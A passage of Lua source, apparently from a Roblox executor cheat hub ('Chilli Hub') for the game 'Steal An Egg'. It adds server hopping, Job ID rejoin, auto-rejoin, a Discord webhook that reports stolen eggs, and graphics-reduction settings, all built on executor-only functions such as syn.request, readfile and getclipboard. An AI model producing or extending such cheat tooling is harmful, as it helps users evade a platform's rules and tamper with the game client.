			v12, v13 = fn13(arg)
			if not v13 then
				return "fetch"
			end
			v11 = v12
			str2 = arg
			n5 = os.clock()
		end

		local function fn14(arg2)
			local tbl9 = {}

			for _, v13 in ipairs(v12) do
				if not tbl8[v13.Id] and v13.Room >= arg2 then
					tbl9[#tbl9 + 1] = v13
				end
			end

			return tbl9
		end

		local v13 = fn14(2)

		if #v13 == 0 then
			v13 = fn14(1)
		end

		if #v13 == 0 and next(tbl8) ~= nil then
			table.clear(tbl8)
			v13 = fn14(1)
		end

		if #v13 == 0 then
			fn12(nil)
			v11 = nil
			return "empty"
		end

		local id

		if arg == "Random" then
			id = v13[math.random(1, #v13)].Id
		else
			table.sort(v13, function(arg2, arg3)
				if arg == "Least Players" then
					return arg2.Playing < arg3.Playing
				end
				return arg2.Playing > arg3.Playing
			end)

			id = v13[1].Id
		end

		flag2 = false
		v10 = id
		n3 = os.clock() + n2
		pcall(fn11)

		if not pcall(function()
			TeleportService:TeleportToPlaceInstance(game.PlaceId, id, localPlayer)
		end) then
			fn12(id)
			return "failed"
		end

		local n7 = os.clock() + n2

		while os.clock() < n7 do
			if flag2 then
				return "denied"
			end
			task.wait(0.25)
		end

		return "waiting"
	end

	tbl4.ServerHop = serverHop

	v8:CreateDropdown({
		Name = "Server Hop Mode",
		Options = { "Most Players", "Random", "Least Players" },
		Default = "Least Players",
		Callback = function(arg)
			str = tostring(arg or "Least Players")
		end,
	})

	v8:CreateButton({
		Name = "Server Hop",
		ButtonText = "Hop",
		Callback = function()
			n4 += 1
			local v12 = n4

			task.spawn(function()
				flag = true
				local n7 = 0

				while v12 == n4 do
					n7 += 1
					local v13 = serverHop(str)

					if not (v13 == "waiting" or v12 ~= n4) then
						if v13 == "empty" then
							v11 = nil
							table.clear(tbl8)
						end

						if n7 % 10 == 0 then
							fn8("Server Hop", string.format("Every server was full so far, %d tries.", n7))
						end

						task.wait(v13 == "fetch" and 1 or 0.1)
						continue
					end

					break
				end

				if v12 == n4 then
					flag = false
				end
			end)
		end,
	})
end

do
	local n2 = 8
	local n3 = 0
	local str = ""
	local v9 = nil

	local function fn9()
		return os.clock() < n3
	end

	local function fn10(arg)
		n3 = arg and os.clock() + n2 or 0
	end

	local function fn11(arg)
		local match = tostring(arg or ""):match("^%s*(.-)%s*$")
		return match:match("%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x") or match
	end

	local function fn12()
		local v10 = str
		local result = str

		if v9 then
			local ok

			ok, result = pcall(function()
				local controller = v9._controller
				return controller and controller.GetValue and controller.GetValue()
			end)

			if not (ok and type(result) == "string" and result ~= "") then
				local exitTo = nil

				for _, v11 in ipairs({ "Get", "GetValue", "GetText" }) do
					local ok2, result2 = pcall(function()
						return v9[v11]
					end)

					if ok2 and type(result2) == "function" then
						local ok3
						ok3, result = pcall(result2, v9)
						if ok3 and type(result) == "string" and result ~= "" then
							exitTo = 1
							break
						end
					end
				end

				if exitTo ~= 1 then
					result = v10
				end
			end
		end

		local v11 = fn11(result)

		if v11 == "" then
			local ok, result2 = pcall(function()
				local v12 = getclipboard or readclipboard or getrbxclipboard
				return type(v12) == "function" and v12() or nil
			end)

			if ok and type(result2) == "string" then
				v11 = fn11(result2)
			end
		end

		return v11
	end

	local function fn13(arg)
		if not v9 then
			return
		end

		pcall(function()
			local controller = v9._controller

			if controller and controller.SetValue then
				controller.SetValue(arg, false)
			end
		end)

		str = fn11(arg)
	end

	local function fn14(arg)
		fn10(true)
		pcall(AutoLoadBeforeTeleport)

		if not pcall(function()
			if game.JobId ~= "" then
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
			else
				TeleportService:Teleport(game.PlaceId, localPlayer)
			end
		end) then
			fn10(false)
			fn8(arg, "Roblox could not rejoin the server.")
		end
	end

	pcall(function()
		TeleportService.TeleportInitFailed:Connect(function(arg, arg2, arg3)
			if not fn9() then
				return
			end
			fn10(false)
			fn8("Teleport Failed", tostring(arg3 ~= "" and arg3 or arg2))
		end)
	end)

	v9 = v8:CreateInput({
		Name = "Job ID",
		Placeholder = "Paste a server Job ID...",
		Default = "",
		MaxLength = 100,
		Callback = function(arg)
			str = fn11(arg)
		end,
	})

	if v9 then
		v9._configIgnored = true

		if v9.State and not v9.State._registered then
			v9.State._configIgnored = true
		end
	end

	v8:CreateButton({
		Name = "Join Job ID",
		ButtonText = "Join",
		Callback = function()
			if fn9() then
				fn8("Join Job ID Failed", "A teleport is already running, try again shortly.")
				return
			end
			local v10 = fn12()
			if v10 == "" then
				fn8("Join Job ID Failed", "Paste a valid Job ID first.")
				return
			end
			fn10(true)
			pcall(AutoLoadBeforeTeleport)

			if not pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, v10, localPlayer)
			end) then
				fn10(false)
				fn8("Join Job ID Failed", "Roblox could not join that server.")
			end
		end,
	})

	v8:CreateButton({
		Name = "Copy Current Job ID",
		ButtonText = "Copy",
		Callback = function()
			local str2 = tostring(game.JobId or "")
			fn13(str2)
			local v10 = setclipboard or toclipboard
			fn8((type(v10) == "function" and pcall(v10, str2) or false) and "Job ID Copied" or "Job ID Shown", str2)
		end,
	})

	v8:CreateButton({
		Name = "Rejoin Server",
		ButtonText = "Rejoin",
		Callback = function()
			if fn9() then
				fn8("Rejoin Failed", "A teleport is already running, try again shortly.")
				return
			end
			fn14("Rejoin Failed")
		end,
	})

	local tbl8 = { Option = nil, Fired = false, TeleportingAt = 0 }

	local function fn15()
		local robloxPromptGui = CoreGui:FindFirstChild("RobloxPromptGui")
		robloxPromptGui = robloxPromptGui and robloxPromptGui:FindFirstChild("promptOverlay")
		return robloxPromptGui ~= nil and robloxPromptGui:FindFirstChild("ErrorPrompt") ~= nil
	end

	pcall(function()
		local connection = localPlayer.OnTeleport:Connect(function(arg)
			if arg == Enum.TeleportState.Failed then
				tbl8.TeleportingAt = 0
			else
				tbl8.TeleportingAt = os.clock()
			end
		end)

		fn4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)
	end)

	tbl8.Option = v8:CreateToggle({ Name = "Auto Rejoin When Disconnect", Default = true })

	local function fn16(arg)
		if tbl8.Fired or tbl8.Option == nil or not tbl4.Toggle(tbl8.Option, false) or fn9() then
			return
		end
		local flag = tbl8.TeleportingAt > 0

		if flag then
			local teleportingAt = tbl8.TeleportingAt
			flag = os.clock() - teleportingAt < 60
		end

		if flag then
			return
		end
		local v10 = string.lower(tostring(arg or ""))
		if v10 == "" or string.find(v10, "teleport", 1, true) then
			return
		end
		local errorCode = nil

		pcall(function()
			errorCode = GuiService:GetErrorCode()
		end)

		if errorCode == Enum.ConnectionError.DisconnectDuplicatePlayer or string.find(v10, "banned", 1, true) or string.find(v10, "same account", 1, true) then
			return
		end
		tbl8.Fired = true
		local placeId = game.PlaceId
		local str2 = tostring(game.JobId or "")
		local flag2 = string.find(v10, "shut", 1, true) ~= nil or string.find(v10, "no longer", 1, true) ~= nil or string.find(v10, "closed", 1, true) ~= nil
		pcall(AutoLoadBeforeTeleport)
		fn8("Auto Rejoin", flag2 and "Server closed, joining another one." or "Disconnected, rejoining now.")

		task.spawn(function()
			local n4 = 0

			while true do
				n4 += 1
				local flag3 = not flag2 and str2 ~= "" and n4 <= 2

				pcall(function()
					if flag3 then
						TeleportService:TeleportToPlaceInstance(placeId, str2, localPlayer)
					else
						TeleportService:Teleport(placeId, localPlayer)
					end
				end)

				task.wait(flag3 and 4 or 5)
			end
		end)
	end

	pcall(function()
		local connection = GuiService.ErrorMessageChanged:Connect(function(arg)
			task.wait(0.3)

			if fn15() then
				fn16(arg)
			end
		end)

		fn4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)
	end)

	task.spawn(function()
		local robloxPromptGui = CoreGui:WaitForChild("RobloxPromptGui", 30)
		robloxPromptGui = robloxPromptGui and robloxPromptGui:WaitForChild("promptOverlay", 30)
		if not robloxPromptGui then
			return
		end

		local connection = robloxPromptGui.ChildAdded:Connect(function(child)
			if child.Name ~= "ErrorPrompt" then
				return
			end
			task.wait(0.2)
			local str2 = ""

			for _, descendant in ipairs(child:GetDescendants()) do
				if descendant:IsA("TextLabel") and descendant.Name == "ErrorMessage" then
					str2 = descendant.Text
				end
			end

			if str2 == "" then
				pcall(function()
					str2 = GuiService:GetErrorMessage()
				end)
			end

			fn16(str2 ~= "" and str2 or "disconnected")
		end)

		fn4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)
	end)
end

do
	local AssetService = game:GetService("AssetService")
	local request_ = syn and syn.request or http and http.request or http_request or request

	local tbl8 = {
		Url = "",
		Stolen = false,
		PingEveryone = false,
		Queue = {},
		Sending = false,
		Notified = {},
		Icons = {},
		Pngs = {},
		Crc = {},
		Known = nil,
		Carry = nil,
		Avatar = nil,
		Disposed = false,
		Path = "ChilliLibrary/SAE_Webhook.txt",
		Saved = "",
		LoadedAt = os.clock(),
		Input = nil,
		Dot = "  " .. utf8.char(183) .. "  ",
		MaxSide = 200,
		Logo = "https://media.discordapp.net/attachments/1181785068637790221/1551685385665380432/chilli.png?ex=6ab2df20&is=6ab18da0&hm=5ca4b16854493c689912c068c29354752a0f2ea0490d5b22cbd9acf7d26ed7eb&=&format=webp&quality=lossless",
		Emoji = {
			Value = "<:sae_value:1551645680718581871>",
			Size = "<:sae_size:1551645444285800558>",
			Mutation = "<:sae_mutation:1551677914146275478>",
			Area = "<:sae_area:1551675973328441416>",
		},
	}

	pcall(function()
		if type(readfile) ~= "function" then
			return
		end

		if type(isfile) == "function" and not isfile(tbl8.Path) then
			return
		end
		local v9 = string.gsub(tostring(readfile(tbl8.Path) or ""), "%s", "")
		tbl8.Saved = v9
		tbl8.Url = v9
	end)

	for i = 0, 255 do
		local v9 = i

		for i2 = 1, 8 do
			if bit32.band(v9, 1) == 1 then
				v9 = bit32.bxor(3988292384, bit32.rshift(v9, 1))
			else
				v9 = bit32.rshift(v9, 1)
			end
		end

		tbl8.Crc[i] = v9
	end

	local function fn9(arg)
		if type(arg) ~= "string" then
			return false
		end

		for _, v9 in ipairs({ "discord%.com", "discordapp%.com", "ptb%.discord%.com", "canary%.discord%.com" }) do
			if string.match(arg, "^https://" .. v9 .. "/api/webhooks/%d+/[%w%-_]+$") then
				return true
			end
		end

		return false
	end

	local function fn10(arg)
		if type(request_) ~= "function" then
			return nil
		end
		local ok, result = pcall(request_, { Url = arg, Method = "GET" })
		if not ok or type(result) ~= "table" or tonumber(result.StatusCode) ~= 200 then
			return nil
		end
		local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, tostring(result.Body))
		return ok2 and result2 or nil
	end

	local function fn11(arg, arg2)
		local flag = type(arg) == "table" and type(arg.data) == "table" and arg.data[1] or nil
		if type(flag) ~= "table" or flag.state ~= "Completed" or type(flag.imageUrl) ~= "string" or flag.imageUrl == "" then
			return nil
		end

		if arg2 and not string.find(flag.imageUrl, "/Image/", 1, true) then
			return nil
		end
		return flag.imageUrl
	end

	local function fn12(arg)
		if tbl8.Icons[arg] == nil then
			tbl8.Icons[arg] = fn11(fn10("https://thumbnails.roblox.com/v1/assets?assetIds=" .. arg .. "&returnPolicy=PlaceHolder&size=420x420&format=Png&isCircular=false"), true) or false
		end

		return tbl8.Icons[arg] or nil
	end

	local function fn13()
		if tbl8.Avatar == nil then
			tbl8.Avatar = fn11(fn10("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. localPlayer.UserId .. "&size=150x150&format=Png&isCircular=false")) or false
		end

		return tbl8.Avatar or nil
	end

	local function fn14(arg, arg2, arg3)
		local crc = tbl8.Crc
		local n2 = 4294967295

		for i = arg2, arg3 do
			local rshift = bit32.rshift
			n2 = bit32.bxor(crc[bit32.band(bit32.bxor(n2, buffer.readu8(arg, i)), 255)], rshift(n2, 8))
		end

		return bit32.bxor(n2, 4294967295)
	end

	local function fn15(arg, arg2, arg3)
		local n2 = arg2 * 4 + 1
		local n3 = n2 * arg3
		local n4 = 2 + math.ceil(n3 / 65535) * 5 + n3 + 4
		local v9 = buffer.create(45 + n4 + 12)
		local n5 = 0

		local function fn16(arg4)
			buffer.writeu8(v9, n5, arg4)
			n5 += 1
		end

		local function fn17(arg4)
			fn16(bit32.band(bit32.rshift(arg4, 24), 255))
			fn16(bit32.band(bit32.rshift(arg4, 16), 255))
			fn16(bit32.band(bit32.rshift(arg4, 8), 255))
			fn16(bit32.band(arg4, 255))
		end

		local function fn18(arg4, arg5, arg6, arg7)
			fn16(arg4)
			fn16(arg5)
			fn16(arg6)
			fn16(arg7)
		end

		for _, v10 in ipairs({ 137, 80, 78, 71, 13, 10, 26, 10 }) do
			fn16(v10)
		end

		fn17(13)
		fn18(73, 72, 68, 82)
		fn17(arg2)
		fn17(arg3)
		fn16(8)
		fn16(6)
		fn16(0)
		fn16(0)
		fn16(0)
		fn17(fn14(v9, n5, n5 - 1))
		local v10 = buffer.create(n3)

		for i = 0, arg3 - 1 do
			buffer.writeu8(v10, i * n2, 0)
			buffer.copy(v10, i * n2 + 1, arg, i * arg2 * 4, arg2 * 4)
		end

		fn17(n4)
		local v11 = n5
		fn18(73, 68, 65, 84)
		fn16(120)
		fn16(1)
		local n6 = 0

		while n6 < n3 do
			local n7 = math.min(65535, n3 - n6)
			fn16(n6 + n7 >= n3 and 1 or 0)
			fn16(bit32.band(n7, 255))
			fn16(bit32.rshift(n7, 8))
			local v12 = bit32.band(bit32.bnot(n7), 65535)
			fn16(bit32.band(v12, 255))
			fn16(bit32.rshift(v12, 8))
			buffer.copy(v9, n5, v10, n6, n7)
			n5 += n7
			n6 += n7
		end

		local n7 = 1
		local n8 = 0

		for i = 0, n3 - 1 do
			n7 = (n7 + buffer.readu8(v10, i)) % 65521
			n8 = (n8 + n7) % 65521
		end

		fn17(n8 * 65536 + n7)
		fn17(fn14(v9, v11, n5 - 1))
		fn17(0)
		fn18(73, 69, 78, 68)
		fn17(fn14(v9, n5, n5 - 1))
		return buffer.tostring(v9)
	end

	local function fn16(arg)
		if tbl8.Pngs[arg] ~= nil then
			return tbl8.Pngs[arg] or nil
		end

		local ok, result = pcall(function()
			local v9 = AssetService:CreateEditableImageAsync(Content.fromUri("rbxassetid://" .. arg))
			local size = v9.Size
			local n2 = math.floor(size.X)
			local n3 = math.floor(size.Y)
			local v10 = v9:ReadPixelsBuffer(Vector2.zero, size)

			pcall(function()
				v9:Destroy()
			end)

			local n4 = math.min(1, tbl8.MaxSide / math.max(n2, n3))
			local n5 = math.max(1, math.floor(n2 * n4))
			local n6 = math.max(1, math.floor(n3 * n4))
			local v11 = buffer.create(n5 * n6 * 4)

			for i = 0, n6 - 1 do
				local n7 = math.min(n3 - 1, math.floor(i / n4))

				for i2 = 0, n5 - 1 do
					buffer.copy(v11, (i * n5 + i2) * 4, v10, (n7 * n2 + math.min(n2 - 1, math.floor(i2 / n4))) * 4, 4)
				end
			end

			return fn15(v11, n5, n6)
		end)

		tbl8.Pngs[arg] = ok and type(result) == "string" and result or false
		return tbl8.Pngs[arg] or nil
	end

	local function fn17(arg, arg2)
		if arg2 then
			return 13686498
		end

		if typeof(arg) ~= "Color3" then
			return 5793266
		end
		return math.floor(arg.R * 255 + 0.5) * 65536 + math.floor(arg.G * 255 + 0.5) * 256 + math.floor(arg.B * 255 + 0.5)
	end

	local function fn18(arg)
		local tbl9 = {}

		if type(arg) == "table" then
			for _, v9 in ipairs(arg) do
				tbl9[#tbl9 + 1] = fn7(v9)
			end
		end

		return #tbl9 > 0 and table.concat(tbl9, ", ") or "None"
	end

	local function fn19(arg)
		local areas = tbl.Areas
		local directory = type(areas) == "table" and (areas.Directory or areas) or nil
		local str = tostring(arg or "")
		local flag = type(directory) == "table" and str ~= "" and directory[str] or nil
		if type(flag) == "table" then
			return tostring(flag.DisplayName or str)
		end
		return str ~= "" and str or "Field"
	end

	local function fn20(arg, arg2, arg3, arg4, arg5, arg6)
		local str = tostring(arg2)
		local v9 = tbl7.AssetInfo(str)
		local n2 = tonumber(arg3) or 1
		arg4 = type(arg4) == "table" and arg4 or {}
		local v10 = tbl7.Income(v9, n2, arg4)
		local dot = tbl8.Dot
		local str2 = string.format("x%.2f", n2)
		local eggRecords = tbl.EggRecords

		if type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
			local ok, result = pcall(eggRecords.WeightKgForScale, str, n2)

			if ok and tonumber(result) then
				str2 ..= dot .. tbl7.FormatWeight(result)
			end
		end

		local emoji = tbl8.Emoji
		local tbl9 = {}
		local str3 = "**" .. tostring(v9.Name) .. "**" .. dot .. tostring(v9.Rarity)
		local str4 = emoji.Value .. " **Value:** $" .. tbl7.FormatRate(v10)
		local str5 = emoji.Size .. " **Size:** " .. str2
		local str6 = emoji.Mutation .. " **Mutation:** " .. fn18(arg4)
		local str7 = emoji.Area .. " **Area:** " .. fn19(arg5)
		tbl9[1] = str3
		tbl9[2] = str4
		tbl9[3] = str5
		tbl9[4] = str6
		tbl9[5] = str7

		local tbl10 = {
			author = { name = localPlayer.DisplayName, icon_url = fn13() },
			title = arg,
			description = table.concat(tbl9, "\n"),
			color = fn17(v9.Color, string.upper(tostring(v9.Rarity)) == "SECRET"),
			footer = { text = "Chilli Hub" .. dot .. "Steal An Egg", icon_url = tbl8.Logo },
			timestamp = DateTime.now():ToIsoDate(),
		}

		local tbl11 = { username = "Chilli Hub", avatar_url = tbl8.Logo, embeds = { tbl10 } }
		local icon = v9.Icon

		if arg6 then
			local directory = tbl.Assets and tbl.Assets.Directory
			local flag = type(directory) == "table" and directory[str] or nil
			local egg = type(flag) == "table" and type(flag.Egg) == "table" and flag.Egg or nil

			if egg and egg.Icon ~= nil then
				icon = egg.Icon
			end
		end

		local num = tonumber(string.match(tostring(icon or ""), "(%d+)"))
		local v11 = num and fn16(num) or nil
		local flag = num and not v11 and fn12(num) or nil

		if v11 then
			tbl10.thumbnail = { url = "attachment://egg.png" }
			tbl11.attachments = { { id = 0, filename = "egg.png" } }
		elseif flag then
			tbl10.thumbnail = { url = flag }
		end

		return tbl11, v11
	end

	local function fn21()
		if tbl8.Sending then
			return
		end
		tbl8.Sending = true

		task.spawn(function()
			while #tbl8.Queue > 0 and not tbl8.Disposed do
				local v9 = table.remove(tbl8.Queue, 1)

				if fn9(tbl8.Url) and type(request_) == "function" then
					local tbl9 = { Url = tbl8.Url, Method = "POST" }

					if v9.Png then
						local str = "ChilliHub" .. string.gsub(HttpService:GenerateGUID(false), "-", "")
						tbl9.Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str }
						local concat = table.concat
						local tbl10 = {}
						local png = v9.Png
						local json = HttpService:JSONEncode(v9.Payload)
						tbl10[1] = "--"
						tbl10[2] = str
						tbl10[3] = "\r\n"
						tbl10[4] = "Content-Disposition: form-data; name=\"payload_json\"\r\n"
						tbl10[5] = "Content-Type: application/json\r\n\r\n"
						tbl10[6] = json
						tbl10[7] = "\r\n"
						tbl10[8] = "--"
						tbl10[9] = str
						tbl10[10] = "\r\n"
						tbl10[11] = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"egg.png\"\r\n"
						tbl10[12] = "Content-Type: image/png\r\n\r\n"
						tbl10[13] = png
						tbl10[14] = "\r\n"
						tbl10[15] = "--"
						tbl10[16] = str
						tbl10[17] = "--\r\n"
						tbl9.Body = concat(tbl10)
					else
						tbl9.Headers = { ["Content-Type"] = "application/json" }
						tbl9.Body = HttpService:JSONEncode(v9.Payload)
					end

					local ok, result = pcall(request_, tbl9)
					local num = ok and type(result) == "table" and tonumber(result.StatusCode) or nil

					if num == 429 and v9.Tries < 3 then
						v9.Tries = v9.Tries + 1
						table.insert(tbl8.Queue, 1, v9)
						task.wait(3)
					elseif num ~= 200 and num ~= 204 and v9.Png then
						v9.Png = nil
						v9.Payload.attachments = nil
						local flag = type(v9.Payload.embeds) == "table" and v9.Payload.embeds[1] or nil

						if flag then
							flag.thumbnail = nil
						end

						table.insert(tbl8.Queue, 1, v9)
					end
				end

				task.wait(1.2)
			end

			tbl8.Sending = false
		end)
	end

	local function fn22()
		return type(request_) == "function" and fn9(tbl8.Url)
	end

	local function fn23(arg, arg2)
		if #tbl8.Queue >= 20 then
			table.remove(tbl8.Queue, 1)
		end

		if tbl8.PingEveryone and type(arg) == "table" then
			arg.content = "@everyone"
			arg.allowed_mentions = { parse = { "everyone" } }
		end

		table.insert(tbl8.Queue, { Payload = arg, Png = arg2, Tries = 0 })
		fn21()
	end

	local eggState = tbl.EggState
	local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

	if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
		local ok, result = pcall(carryChanged.Connect, carryChanged, function(arg)
			if type(arg) ~= "table" then
				return
			end

			if arg.IsCarrying then
				tbl8.Carry = {
					Category = tostring(arg.AssetCategory),
					Uid = tostring(arg.Uid),
					Area = tostring(arg.AreaId or "Field"),
					EndedAt = nil,
				}
			elseif tbl8.Carry then
				tbl8.Carry.EndedAt = os.clock()
			end
		end)

		if ok and result then
			fn4(function()
				pcall(function()
					result:Disconnect()
				end)
			end)
		end
	end

	fn4(function()
		tbl8.Disposed = true
	end)

	task.spawn(function()
		while not tbl8.Disposed do
			local flag = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
			local flag2 = false
			local result = nil

			if flag then
				flag2, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
			end

			if flag2 and type(result) == "table" then
				local known = tbl8.Known
				local tbl9 = {}
				local known2 = {}

				for k, v9 in pairs(result) do
					local str = tostring(k)
					known2[str] = true

					if known and not known[str] and type(v9) == "table" then
						tbl9[#tbl9 + 1] = { Uid = str, Record = v9 }
					end
				end

				tbl8.Known = known2
				local carry = tbl8.Carry

				if tbl8.Stolen and carry and #tbl9 > 0 then
					for _, v9 in ipairs(tbl9) do
						local record = v9.Record
						local flag3 = carry.EndedAt == nil

						if not flag3 then
							local endedAt = carry.EndedAt
							flag3 = os.clock() - endedAt < 20
						end

						if flag3 then
							flag3 = v9.Uid == carry.Uid

							if not flag3 then
								local category = carry.Category
								flag3 = tostring(record.AssetCategory) == category
							end
						end

						if flag3 then
							tbl8.Carry = nil
							local mutations = type(record.Mutations) == "table" and record.Mutations or {}

							task.spawn(function()
								if fn22() then
									fn23(fn20("Egg Stolen!", record.AssetCategory, record.AssetScale, mutations, carry.Area))
								end
							end)

							break
						end
					end
				end
			end

			task.wait(1.5)
		end
	end)

	local function fn24(arg)
		local input = tbl8.Input
		if type(input) ~= "table" then
			return
		end

		for _, v9 in ipairs({ "Set", "SetValue" }) do
			local ok, result = pcall(function()
				return input[v9]
			end)

			if ok and type(result) == "function" and pcall(result, input, arg, false) then
				return
			end
		end
	end

	tbl8.Input = v6:CreateInput({
		Name = "Webhook URL",
		Placeholder = "https://discord.com/api/webhooks/...",
		Default = tbl8.Saved,
		MaxLength = 256,
		Callback = function(arg)
			local v9 = string.gsub(tostring(arg or ""), "%s", "")
			local flag = v9 == "" and tbl8.Saved ~= ""

			if flag then
				local loadedAt = tbl8.LoadedAt
				flag = os.clock() - loadedAt < 5
			end

			if flag then
				tbl8.Url = tbl8.Saved
				task.defer(fn24, tbl8.Saved)
				return
			end

			tbl8.Url = v9

			if (v9 == "" or fn9(v9)) and v9 ~= tbl8.Saved and type(writefile) == "function" then
				if pcall(writefile, tbl8.Path, v9) then
					tbl8.Saved = v9
				end
			end
		end,
	})

	v6:CreateToggle({
		Name = "Ping @everyone",
		Default = false,
		Callback = function(arg)
			tbl8.PingEveryone = arg == true
		end,
	})

	v6:CreateToggle({
		Name = "Notify Stolen Eggs",
		Note = "Post every egg you bring home",
		Default = false,
		Callback = function(arg)
			tbl8.Stolen = arg == true
		end,
	})
end

local v9
v9 = v2:CreateTab({ Name = "Misc", SectionsExpanded = true })
local v10
v10 = v9:CreateSection({ Name = "Performance", Expanded = true })
local flag = false

v10:CreateSlider({
	Name = "FPS Cap",
	Min = 30,
	Max = 1000,
	Default = 240,
	AllowDecimals = false,
	Increment = 1,
	Unit = " FPS",
	Callback = function(arg)
		local n2 = math.clamp(math.floor(tonumber(arg) or 240), 30, 1000)
		if type(setfpscap) == "function" and pcall(setfpscap, n2) then
			flag = false
			return
		end

		if not flag then
			flag = true
			fn8("FPS Cap Unavailable", "This environment does not support setfpscap.")
		end
	end,
})

do
	local Lighting = game:GetService("Lighting")
	local n2 = 0.003
	local flag2 = false
	local n3 = 0
	local thread = nil
	local tbl8 = {}
	local tbl9 = {}
	local obj = setmetatable({}, { __mode = "k" })
	local tbl10 = {}
	local connection = nil

	local function fn9(arg, arg2, arg3)
		local ok, result = pcall(arg)
		if not ok then
			return
		end
		tbl9[#tbl9 + 1] = { Setter = arg2, Value = result }
		pcall(arg2, arg3)
	end

	local function fn10(arg, arg2, arg3)
		local tbl11 = obj[arg]

		if not tbl11 then
			tbl11 = {}
			obj[arg] = tbl11
		end

		if tbl11[arg2] == nil then
			local ok, result = pcall(function()
				return arg[arg2]
			end)

			if not ok then
				return
			end
			tbl11[arg2] = { Value = result }
		end

		pcall(function()
			arg[arg2] = arg3
		end)
	end

	local function fn11(arg)
		if not flag2 or not arg.Parent then
			return
		end

		if arg:IsA("ParticleEmitter") then
			fn10(arg, "Enabled", false)
			fn10(arg, "Rate", 0)
		elseif arg:IsA("Trail") or arg:IsA("Beam") then
			fn10(arg, "Enabled", false)
		elseif arg:IsA("PointLight") or arg:IsA("SpotLight") or arg:IsA("SurfaceLight") then
			fn10(arg, "Enabled", false)
			fn10(arg, "Brightness", 0)
		elseif arg:IsA("Fire") or arg:IsA("Smoke") or arg:IsA("Sparkles") then
			fn10(arg, "Enabled", false)
		elseif arg:IsA("Explosion") then
			fn10(arg, "Visible", false)
		elseif arg:IsA("SpecialMesh") then
			fn10(arg, "TextureId", "")
		elseif arg:IsA("Decal") or arg:IsA("Texture") then
			if not (arg.Name == "face" and arg.Parent and arg.Parent.Name == "Head") then
				fn10(arg, "Transparency", 1)
			end
		elseif arg:IsA("MeshPart") then
			fn10(arg, "RenderFidelity", Enum.RenderFidelity.Performance)
			fn10(arg, "TextureID", "")
			fn10(arg, "CastShadow", false)
			fn10(arg, "Reflectance", 0)
			fn10(arg, "Material", Enum.Material.SmoothPlastic)
		elseif arg:IsA("BasePart") then
			fn10(arg, "CastShadow", false)
			fn10(arg, "Reflectance", 0)
			fn10(arg, "Material", Enum.Material.SmoothPlastic)
		elseif arg:IsA("PostEffect") then
			fn10(arg, "Enabled", false)
		elseif arg:IsA("Clouds") then
			fn10(arg, "Cover", 0)
			fn10(arg, "Density", 0)
		elseif arg:IsA("Atmosphere") then
			fn10(arg, "Density", 0)
			fn10(arg, "Haze", 0)
			fn10(arg, "Glare", 0)
		end
	end

	local function fn12()
		for _, v11 in ipairs(tbl8) do
			if v11.Connected then
				v11:Disconnect()
			end
		end

		table.clear(tbl8)

		if connection then
			pcall(function()
				connection:Disconnect()
			end)

			connection = nil
		end
	end

	local function fn13()
		local rendering = settings().Rendering
		local terrain = workspace.Terrain

		local function fn14(arg, arg2, arg3)
			fn9(function()
				return arg[arg2]
			end, function(arg4)
				arg[arg2] = arg4
			end, arg3)
		end

		fn14(rendering, "QualityLevel", Enum.QualityLevel.Level01)
		fn14(rendering, "MeshPartDetailLevel", Enum.MeshPartDetailLevel.Level01)
		fn14(rendering, "EditQualityLevel", Enum.QualityLevel.Level01)

		local ok, result = pcall(function()
			return UserSettings():GetService("UserGameSettings")
		end)

		if ok and result then
			fn14(result, "SavedQualityLevel", Enum.SavedQualitySetting.QualityLevel1)
		end

		fn14(Lighting, "GlobalShadows", false)
		fn14(Lighting, "ShadowSoftness", 0)
		fn14(Lighting, "FogEnd", 9e9)
		fn14(Lighting, "Technology", Enum.Technology.Legacy)
		fn14(Lighting, "EnvironmentDiffuseScale", 0)
		fn14(Lighting, "EnvironmentSpecularScale", 0)
		fn14(terrain, "Decoration", false)
		fn14(terrain, "WaterWaveSize", 0)
		fn14(terrain, "WaterWaveSpeed", 0)
		fn14(terrain, "WaterReflectance", 0)
		fn14(terrain, "WaterTransparency", 1)
	end

	local function fn14(arg, arg2)
		local now = os.clock()

		for _, descendant in ipairs(arg:GetDescendants()) do
			if not flag2 or n3 ~= arg2 then
				return false
			end
			fn11(descendant)

			if os.clock() - now > n2 then
				RunService.Heartbeat:Wait()
				now = os.clock()
			end
		end

		return true
	end

	local function fn15()
		if not flag2 or #tbl10 == 0 then
			return
		end
		local now = os.clock()

		while #tbl10 > 0 do
			local v11 = table.remove(tbl10)
			fn11(v11)
			if not (n2 < os.clock() - now) then
				continue
			end
			break
		end
	end

	local function fn16()
		local now = os.clock()

		for k, v11 in pairs(obj) do
			if k.Parent then
				for k2, v12 in pairs(v11) do
					pcall(function()
						k[k2] = v12.Value
					end)
				end
			end

			obj[k] = nil

			if os.clock() - now > n2 then
				RunService.Heartbeat:Wait()
				now = os.clock()
			end
		end
	end

	local function fn17()
		if not flag2 then
			return
		end
		flag2 = false
		n3 += 1
		fn12()
		table.clear(tbl10)

		if thread then
			pcall(task.cancel, thread)
			thread = nil
		end

		fn16()

		for i = #tbl9, 1, -1 do
			local v11 = tbl9[i]
			pcall(v11.Setter, v11.Value)
		end

		table.clear(tbl9)
	end

	local function fn18()
		if flag2 then
			return
		end
		flag2 = true
		n3 += 1
		local v11 = n3
		fn13()

		local function fn19(arg)
			tbl8[#tbl8 + 1] = arg.DescendantAdded:Connect(function(descendant)
				if flag2 and n3 == v11 then
					tbl10[#tbl10 + 1] = descendant
				end
			end)
		end

		fn19(workspace)
		fn19(Lighting)

		connection = RunService.Heartbeat:Connect(function()
			if flag2 and n3 == v11 then
				fn15()
			end
		end)

		thread = task.spawn(function()
			if fn14(workspace, v11) then
